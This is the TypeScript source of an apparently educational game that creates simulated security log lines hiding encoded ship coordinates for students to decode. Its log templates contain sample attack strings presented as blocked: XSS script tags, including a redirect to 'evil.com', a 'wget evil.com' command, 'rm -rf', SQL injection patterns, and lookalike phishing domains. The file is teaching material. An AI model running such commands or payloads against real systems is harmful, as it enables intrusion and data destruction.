import { Ship} from '../models/Ship.js';
import { CyberTrafficMessage, AttackType, TrafficCategory, TrafficSeverity } from '../models/AttackTypes.js';

export type EncodingType = 'base64' | 'hex' | 'rot13' | 'binary' | 'ascii';

export class CyberTrafficGenerator {
  private ships: Ship[];
  private difficulty_phase: number = 1; // Controls hint visibility: 1=Explicit, 2=Vague, 3=None
  private lastShownShipIndex: number = -1; // Track last ship to avoid immediate repeats

  constructor(ships: Ship[]) {
    this.ships = ships;
  }

  setDifficultyPhase(phase: number): void {
    // Phase 2 (0-50 min): Show encoding type labels - Learning & Recognition
    // Phase 3 (50+ min): Hide encoding type labels - Mastery (students recognize patterns)
    this.difficulty_phase = Math.min(3, Math.max(1, phase));
  }

  /**
   * Generate a traffic message (either noise or leak)
   */
  generateMessage(leak_probability: number = 0.3, encoding?: EncodingType): CyberTrafficMessage {
    const should_leak = Math.random() < leak_probability;
    
    if (should_leak) {
      return this.generateLeakMessage(encoding);
    } else {
      return this.generateNoiseMessage();
    }
  }

  /**
   * Generate a noise message (normal traffic, no clues)
   */
  private generateNoiseMessage(): CyberTrafficMessage {
    const noiseTemplates = [
      // HTTP Traffic
      {
        category: 'HTTP' as TrafficCategory,
        severity: 'INFO' as TrafficSeverity,
        messages: [
          'GET /api/products - 200 OK - 125ms',
          'POST /api/checkout - 201 Created - 89ms',
          'GET /images/logo.png - 304 Not Modified',
          'GET /api/users/profile - 200 OK - 56ms',
          'POST /api/comments - 200 OK - 143ms',
          'PUT /api/settings - 200 OK - 72ms',
          'GET /dashboard - 200 OK - User: john.doe',
          'GET /static/styles.css - 200 OK - 15ms'
        ]
      },
      // System Messages
      {
        category: 'SYSTEM' as TrafficCategory,
        severity: 'INFO' as TrafficSeverity,
        messages: [
          'Backup completed successfully - 2.4GB archived',
          'Scheduled maintenance task completed',
          'Cache cleared - 1,245 entries removed',
          'System health check: All services operational',
          'Database optimization completed - 0.8s',
          'Log rotation completed - 15 files archived',
          'Certificate renewal check: Valid until 2027-03-15',
          'Session cleanup: 23 expired sessions removed'
        ]
      },
      // Database
      {
        category: 'DATABASE' as TrafficCategory,
        severity: 'INFO' as TrafficSeverity,
        messages: [
          'Query executed: SELECT * FROM products WHERE category="electronics"',
          'Connection pool: 12/50 connections active',
          'Index optimization completed on users table',
          'Read query: SELECT name, email FROM customers LIMIT 100',
          'Transaction committed successfully - 0.023s',
          'Cache hit ratio: 94.2%'
        ]
      },
      // Auth
      {
        category: 'AUTH' as TrafficCategory,
        severity: 'INFO' as TrafficSeverity,
        messages: [
          `User jane.smith logged in from 192.168.1.${this.randomInt(100, 200)}`,
          `Successful login: admin from 192.168.1.${this.randomInt(10, 50)}`,
          `User bob.jones accessed /dashboard`,
          `Session created for user: alice.williams`,
          `Password change successful for user: david.brown`,
          `Two-factor authentication verified for user: emma.davis`
        ]
      },
      // Firewall (normal blocks)
      {
        category: 'FIREWALL' as TrafficCategory,
        severity: 'INFO' as TrafficSeverity,
        messages: [
          `ALLOW: 192.168.1.${this.randomInt(10, 200)} -> 192.168.1.10:443 (HTTPS)`,
          `ALLOW: 10.0.1.${this.randomInt(1, 100)} -> 192.168.1.20:80 (HTTP)`,
          `Rule #5 applied: Allow internal network traffic`,
          `ALLOW: 192.168.1.${this.randomInt(10, 200)} -> 192.168.1.30:22 (SSH) - Authenticated`
        ]
      },
      // Email
      {
        category: 'EMAIL' as TrafficCategory,
        severity: 'INFO' as TrafficSeverity,
        messages: [
          'Email sent to customer@example.com - Order confirmation',
          'Received: Newsletter subscription from user@domain.com',
          'Email delivered: Monthly report to team@company.com',
          'Spam filter: 12 messages blocked',
          'Email queue: 5 messages pending delivery'
        ]
      }
    ];

    const template = noiseTemplates[Math.floor(Math.random() * noiseTemplates.length)];
    const message = template.messages[Math.floor(Math.random() * template.messages.length)];

    return {
      timestamp: new Date().toISOString(),
      severity: template.severity,
      category: template.category,
      message,
      contains_clue: false
    };
  }

  /**
   * Generate a leak message containing encoded coordinates for a ship
   */
  private generateLeakMessage(forcedEncoding?: EncodingType): CyberTrafficMessage {
    // Pick a random ship that is active and hasn't been sunk
    const active_ships = this.ships.filter(s => s.is_active && s.status !== 'sunk');
    if (active_ships.length === 0) {
      return this.generateNoiseMessage();
    }

    // Better distribution: avoid showing same ship consecutively if possible
    let shipIndex: number;
    if (active_ships.length === 1) {
      // Only one ship left - no choice
      shipIndex = 0;
    } else {
      // Pick random, but avoid last shown if possible
      do {
        shipIndex = Math.floor(Math.random() * active_ships.length);
      } while (shipIndex === this.lastShownShipIndex && active_ships.length > 1);
      
      this.lastShownShipIndex = shipIndex;
    }

    const ship = active_ships[shipIndex];
    const coordinate = `${ship.row}${ship.column}`;
    
    // Phase 3 (difficulty_phase 3, no hints): 25% chance of layered encoding
    const useLayered = this.difficulty_phase === 3 && Math.random() < 0.25;
    
    let encoded: string;
    let encoding: EncodingType;
    
    if (useLayered && !forcedEncoding) {
      const layered = this.encodeLayered(coordinate);
      encoded = layered.encoded;
      encoding = layered.layers[layered.layers.length - 1]; // Report the final encoding type
    } else {
      encoding = forcedEncoding || this.selectEncoding();
      encoded = this.encodeCoordinate(coordinate, encoding);
    }

    // Generate message based on attack type
    const message = this.generateAttackMessage(ship.attack_type, encoded, encoding);

    // Only show hints in phases 1-2 (< 50 min)
    // From phase 3 onwards (50+ min), students must identify attack types and encoding themselves
    const showHints = this.difficulty_phase < 3;

    return {
      ...message,
      contains_clue: true,
      attack_type: showHints ? ship.attack_type : undefined, // Hide attack type icon in Phase 3
      encoded_data: encoded,
      encoding_type: showHints ? encoding : undefined
    };
  }

  /**
   * Select encoding type based on difficulty phase
   */
  private selectEncoding(): EncodingType {
    // All phases: Use all encoding types randomly
    // The difficulty comes from hint visibility, not encoding variety
    const encodings: EncodingType[] = ['base64', 'hex', 'rot13', 'binary', 'ascii'];
    return encodings[Math.floor(Math.random() * encodings.length)];
  }

  /**
   * Generate attack-specific message with encoded coordinate
   */
  private generateAttackMessage(
    attackType: AttackType,
    encoded: string,
    encoding: EncodingType
  ): Omit<CyberTrafficMessage, 'contains_clue' | 'attack_type' | 'encoded_data' | 'encoding_type'> {
    
    const encodingHints: Record<number, string> = {
      1: ` [${encoding.toUpperCase()}]`, // Phase 1: Explicit - learn the tools
      2: ` (encoded)`,                   // Phase 2: Vague - apply knowledge
      3: ''                               // Phase 3: None - expert mode
    };
    
    const hint = encodingHints[this.difficulty_phase];

    switch (attackType) {
      case 'sql_injection':
        return this.generateSQLInjectionMessage(encoded, hint);
      case 'xss':
        return this.generateXSSMessage(encoded, hint);
      case 'port_scan':
        return this.generatePortScanMessage(encoded, hint);
      case 'brute_force':
        return this.generateBruteForceMessage(encoded, hint);
      case 'phishing':
        return this.generatePhishingMessage(encoded, hint);
      case 'ddos':
        return this.generateDDoSMessage(encoded, hint);
      case 'mitm':
        return this.generateMITMMessage(encoded, hint);
      case 'command_injection':
        return this.generateCommandInjectionMessage(encoded, hint);
      case 'ransomware':
        return this.generateRansomwareMessage(encoded, hint);
      case 'session_hijacking':
        return this.generateSessionHijackingMessage(encoded, hint);
      default:
        return this.generateSQLInjectionMessage(encoded, hint);
    }
  }

  private generateSQLInjectionMessage(encoded: string, hint: string): Omit<CyberTrafficMessage, 'contains_clue' | 'attack_type' | 'encoded_data' | 'encoding_type'> {
    const templates = [
      {
        severity: 'ERROR' as TrafficSeverity,
        category: 'DATABASE' as TrafficCategory,
        message: `SQL syntax error near '${encoded}'${hint} - Query rejected`
      },
      {
        severity: 'WARN' as TrafficSeverity,
        category: 'DATABASE' as TrafficCategory,
        message: `Suspicious SQL pattern detected: SELECT * FROM users WHERE id='${encoded}'${hint} OR '1'='1'`
      },
      {
        severity: 'ALERT' as TrafficSeverity,
        category: 'DATABASE' as TrafficCategory,
        message: `SQL injection attempt blocked - Malicious payload: ${encoded}${hint}`
      },
      {
        severity: 'ERROR' as TrafficSeverity,
        category: 'HTTP' as TrafficCategory,
        message: `POST /api/login - SQL injection detected in parameter: username='admin' UNION SELECT ${encoded}${hint}`
      }
    ];

    const template = templates[Math.floor(Math.random() * templates.length)];
    return {
      timestamp: new Date().toISOString(),
      severity: template.severity,
      category: template.category,
      message: template.message
    };
  }

  private generateXSSMessage(encoded: string, hint: string): Omit<CyberTrafficMessage, 'contains_clue' | 'attack_type' | 'encoded_data' | 'encoding_type'> {
    const templates = [
      {
        severity: 'WARN' as TrafficSeverity,
        category: 'HTTP' as TrafficCategory,
        message: `XSS attempt detected: <script>alert('${encoded}'${hint})</script>`
      },
      {
        severity: 'ALERT' as TrafficSeverity,
        category: 'HTTP' as TrafficCategory,
        message: `Malicious script blocked in search query: <img src=x onerror='leak:${encoded}${hint}'>`
      },
      {
        severity: 'ERROR' as TrafficSeverity,
        category: 'HTTP' as TrafficCategory,
        message: `Sanitizer triggered: Removed <script>window.location='evil.com/${encoded}${hint}'</script>`
      },
      {
        severity: 'WARN' as TrafficSeverity,
        category: 'HTTP' as TrafficCategory,
        message: `GET /search?q=<svg/onload=alert('${encoded}${hint}')> - XSS blocked`
      }
    ];

    const template = templates[Math.floor(Math.random() * templates.length)];
    return {
      timestamp: new Date().toISOString(),
      severity: template.severity,
      category: template.category,
      message: template.message
    };
  }

  private generatePortScanMessage(encoded: string, hint: string): Omit<CyberTrafficMessage, 'contains_clue' | 'attack_type' | 'encoded_data' | 'encoding_type'> {
    const ip = `203.0.${this.randomInt(100, 255)}.${this.randomInt(1, 255)}`;
    const port = [22, 80, 443, 3306, 8080, 21, 23, 3389][Math.floor(Math.random() * 8)];
    
    const templates = [
      {
        severity: 'ALERT' as TrafficSeverity,
        category: 'FIREWALL' as TrafficCategory,
        message: `Port scan detected from IP: ${ip} - Target: ${encoded}${hint}`
      },
      {
        severity: 'WARN' as TrafficSeverity,
        category: 'FIREWALL' as TrafficCategory,
        message: `BLOCK: ${ip} -> Port ${port} - Rapid connection attempts from location ${encoded}${hint}`
      },
      {
        severity: 'ALERT' as TrafficSeverity,
        category: 'FIREWALL' as TrafficCategory,
        message: `Suspicious activity: ${ip} probing ports 22, 80, 443 from zone ${encoded}${hint}`
      },
      {
        severity: 'ERROR' as TrafficSeverity,
        category: 'FIREWALL' as TrafficCategory,
        message: `IDS Alert: Network scan detected - Source identifier: ${encoded}${hint}`
      }
    ];

    const template = templates[Math.floor(Math.random() * templates.length)];
    return {
      timestamp: new Date().toISOString(),
      severity: template.severity,
      category: template.category,
      source_ip: ip,
      message: template.message
    };
  }

  private generateBruteForceMessage(encoded: string, hint: string): Omit<CyberTrafficMessage, 'contains_clue' | 'attack_type' | 'encoded_data' | 'encoding_type'> {
    const ip = `10.0.${this.randomInt(1, 255)}.${this.randomInt(1, 255)}`;
    const attempts = this.randomInt(20, 100);
    
    const templates = [
      {
        severity: 'ALERT' as TrafficSeverity,
        category: 'AUTH' as TrafficCategory,
        message: `Failed login attempt #${attempts} from IP: ${ip} - Account: ${encoded}${hint}`
      },
      {
        severity: 'ERROR' as TrafficSeverity,
        category: 'AUTH' as TrafficCategory,
        message: `Brute force attack detected: ${attempts} failed attempts from location ${encoded}${hint}`
      },
      {
        severity: 'WARN' as TrafficSeverity,
        category: 'AUTH' as TrafficCategory,
        message: `Account lockout triggered for suspicious activity at ${encoded}${hint} - IP: ${ip}`
      },
      {
        severity: 'ALERT' as TrafficSeverity,
        category: 'AUTH' as TrafficCategory,
        message: `Password spray attack detected from coordinates ${encoded}${hint} - ${attempts} accounts targeted`
      }
    ];

    const template = templates[Math.floor(Math.random() * templates.length)];
    return {
      timestamp: new Date().toISOString(),
      severity: template.severity,
      category: template.category,
      source_ip: ip,
      message: template.message
    };
  }

  private generatePhishingMessage(encoded: string, hint: string): Omit<CyberTrafficMessage, 'contains_clue' | 'attack_type' | 'encoded_data' | 'encoding_type'> {
    const suspiciousDomains = [
      'paypa1.com', 'microsooft.com', 'goog1e.com', 'arnaz0n.com',
      'bank-verify.net', 'account-security.biz', 'urgent-action.info'
    ];
    const domain = suspiciousDomains[Math.floor(Math.random() * suspiciousDomains.length)];
    
    const templates = [
      {
        severity: 'WARN' as TrafficSeverity,
        category: 'EMAIL' as TrafficCategory,
        message: `Suspicious email from ceo@comp4ny.com - Link: ${domain}/verify/${encoded}${hint}`
      },
      {
        severity: 'ALERT' as TrafficSeverity,
        category: 'EMAIL' as TrafficCategory,
        message: `Phishing attempt detected - Email contains link to ${domain}/${encoded}${hint}`
      },
      {
        severity: 'ERROR' as TrafficSeverity,
        category: 'EMAIL' as TrafficCategory,
        message: `Blocked phishing email: "URGENT: Verify your account at evil-site.com/${encoded}${hint}"`
      },
      {
        severity: 'WARN' as TrafficSeverity,
        category: 'EMAIL' as TrafficCategory,
        message: `Social engineering attempt: Email contains credential harvesting link - ID: ${encoded}${hint}`
      }
    ];

    const template = templates[Math.floor(Math.random() * templates.length)];
    return {
      timestamp: new Date().toISOString(),
      severity: template.severity,
      category: template.category,
      message: template.message
    };
  }

  private generateDDoSMessage(encoded: string, hint: string): Omit<CyberTrafficMessage, 'contains_clue' | 'attack_type' | 'encoded_data' | 'encoding_type'> {
    const reqPerSec = this.randomInt(5000, 50000);
    const botnetSize = this.randomInt(100, 5000);
    
    const templates = [
      {
        severity: 'ALERT' as TrafficSeverity,
        category: 'FIREWALL' as TrafficCategory,
        message: `DDoS detected: ${reqPerSec} req/sec from botnet - Attack signature: ${encoded}${hint}`
      },
      {
        severity: 'ERROR' as TrafficSeverity,
        category: 'SYSTEM' as TrafficCategory,
        message: `Server overload! Traffic spike from ${botnetSize} IPs - Botnet ID: ${encoded}${hint}`
      },
      {
        severity: 'ALERT' as TrafficSeverity,
        category: 'FIREWALL' as TrafficCategory,
        message: `CRITICAL: Rate limit exceeded by 1000x - DDoS source cluster: ${encoded}${hint}`
      }
    ];

    const template = templates[Math.floor(Math.random() * templates.length)];
    return {
      timestamp: new Date().toISOString(),
      severity: template.severity,
      category: template.category,
      message: template.message
    };
  }

  private generateMITMMessage(encoded: string, hint: string): Omit<CyberTrafficMessage, 'contains_clue' | 'attack_type' | 'encoded_data' | 'encoding_type'> {
    const templates = [
      {
        severity: 'ALERT' as TrafficSeverity,
        category: 'SYSTEM' as TrafficCategory,
        message: `SSL Certificate mismatch detected - Potential MITM from endpoint: ${encoded}${hint}`
      },
      {
        severity: 'ERROR' as TrafficSeverity,
        category: 'SYSTEM' as TrafficCategory,
        message: `ARP spoofing detected! Duplicate gateway MAC - Attacker location: ${encoded}${hint}`
      },
      {
        severity: 'WARN' as TrafficSeverity,
        category: 'SYSTEM' as TrafficCategory,
        message: `TLS downgrade attack attempt from proxy node ${encoded}${hint}`
      }
    ];

    const template = templates[Math.floor(Math.random() * templates.length)];
    return {
      timestamp: new Date().toISOString(),
      severity: template.severity,
      category: template.category,
      message: template.message
    };
  }

  private generateCommandInjectionMessage(encoded: string, hint: string): Omit<CyberTrafficMessage, 'contains_clue' | 'attack_type' | 'encoded_data' | 'encoding_type'> {
    const templates = [
      {
        severity: 'ALERT' as TrafficSeverity,
        category: 'SYSTEM' as TrafficCategory,
        message: `Command injection detected: exec('rm -rf'); from input field ${encoded}${hint}`
      },
      {
        severity: 'ERROR' as TrafficSeverity,
        category: 'HTTP' as TrafficCategory,
        message: `Shell command blocked: wget evil.com; payload origin: ${encoded}${hint}`
      },
      {
        severity: 'ALERT' as TrafficSeverity,
        category: 'SYSTEM' as TrafficCategory,
        message: `CRITICAL: Unauthorized process execution attempt from zone ${encoded}${hint}`
      }
    ];

    const template = templates[Math.floor(Math.random() * templates.length)];
    return {
      timestamp: new Date().toISOString(),
      severity: template.severity,
      category: template.category,
      message: template.message
    };
  }

  private generateRansomwareMessage(encoded: string, hint: string): Omit<CyberTrafficMessage, 'contains_clue' | 'attack_type' | 'encoded_data' | 'encoding_type'> {
    const filesEncrypted = this.randomInt(100, 10000);
    
    const templates = [
      {
        severity: 'ALERT' as TrafficSeverity,
        category: 'SYSTEM' as TrafficCategory,
        message: `RANSOMWARE ALERT: ${filesEncrypted} files encrypted - Malware signature: ${encoded}${hint}`
      },
      {
        severity: 'ERROR' as TrafficSeverity,
        category: 'SYSTEM' as TrafficCategory,
        message: `Mass file modification detected (.locked extension) - Origin host: ${encoded}${hint}`
      },
      {
        severity: 'ALERT' as TrafficSeverity,
        category: 'EMAIL' as TrafficCategory,
        message: `Suspicious attachment executed - Encryption process started from ${encoded}${hint}`
      }
    ];

    const template = templates[Math.floor(Math.random() * templates.length)];
    return {
      timestamp: new Date().toISOString(),
      severity: template.severity,
      category: template.category,
      message: template.message
    };
  }

  private generateSessionHijackingMessage(encoded: string, hint: string): Omit<CyberTrafficMessage, 'contains_clue' | 'attack_type' | 'encoded_data' | 'encoding_type'> {
    const templates = [
      {
        severity: 'WARN' as TrafficSeverity,
        category: 'AUTH' as TrafficCategory,
        message: `Session cookie theft detected - Stolen token from endpoint: ${encoded}${hint}`
      },
      {
        severity: 'ERROR' as TrafficSeverity,
        category: 'AUTH' as TrafficCategory,
        message: `Simultaneous login from 2 locations - Session hijack from ${encoded}${hint}`
      },
      {
        severity: 'ALERT' as TrafficSeverity,
        category: 'AUTH' as TrafficCategory,
        message: `XSS-based session steal attempt - Attacker harvesting cookies at ${encoded}${hint}`
      }
    ];

    const template = templates[Math.floor(Math.random() * templates.length)];
    return {
      timestamp: new Date().toISOString(),
      severity: template.severity,
      category: template.category,
      message: template.message
    };
  }

  /**
   * Encoding functions
   */
  private encodeCoordinate(coord: string, type: EncodingType): string {
    switch (type) {
      case 'base64':
        return Buffer.from(coord).toString('base64');
      case 'hex':
        return Buffer.from(coord).toString('hex');
      case 'rot13':
        return this.rot13(coord);
      case 'binary':
        return coord.split('').map(c => 
          c.charCodeAt(0).toString(2).padStart(8, '0')
        ).join(' ');
      case 'ascii':
        return coord.split('').map(c => c.charCodeAt(0)).join(' ');
      default:
        return coord;
    }
  }

  /**
   * Layered encoding: Apply multiple encoding layers (Phase 4+)
   * Example: "D4" → Base64 → Hex = "4e54453d"
   */
  private encodeLayered(coord: string): { encoded: string; layers: EncodingType[] } {
    const encodingTypes: EncodingType[] = ['base64', 'hex', 'rot13', 'binary', 'ascii'];
    const numLayers = 2; // Always use 2 layers for consistency
    const layers: EncodingType[] = [];
    
    let result = coord;
    for (let i = 0; i < numLayers; i++) {
      const encoding = encodingTypes[Math.floor(Math.random() * encodingTypes.length)];
      result = this.encodeCoordinate(result, encoding);
      layers.push(encoding);
    }
    
    return { encoded: result, layers };
  }

  private rot13(str: string): string {
    return str.replace(/[A-Za-z]/g, (char) => {
      const start = char <= 'Z' ? 65 : 97;
      return String.fromCharCode(((char.charCodeAt(0) - start + 13) % 26) + start);
    });
  }

  private randomInt(min: number, max: number): number {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }
}
